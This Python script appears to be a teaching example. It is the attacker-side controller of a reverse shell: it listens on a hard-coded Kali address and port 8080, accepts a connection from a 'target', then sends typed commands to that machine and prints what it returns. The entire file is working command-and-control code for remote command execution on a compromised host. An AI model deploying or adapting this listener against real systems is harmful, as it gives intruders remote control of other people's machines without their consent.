# Server side

# Basic TCP Server

import socket  # For Building TCP Connection


def connect():

    # start a socket object 's'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.bind(("10.0.2.15", 8080))  # define the kali IP and the listening port
    # define the backlog size, since we are expecting a single connection
    s.listen(1)

# target we will listen to one connection

    print('[+] Listening for incoming TCP connection on port 8080')

    # accept() function will return the connection object ID  (conn) and will return the client(target) IP address and source
    conn, addr = s.accept()
    # port in a tuple format (IP,port)

    print('[+] We got a connection from: ', addr)

    while True:
        # Get user input and store it in command
        command = input("Shell> ")

        if 'terminate' in command:  # If we got terminate command, inform the client and  close the connect and break the loop
            conn.send('terminate')
            conn.close()
            break
        else:
            # Otherwise we will send the command to the target
            conn.send(command)
            print(conn.recv(1024))  # and print the result that we got back


def main():
    connect()


main()
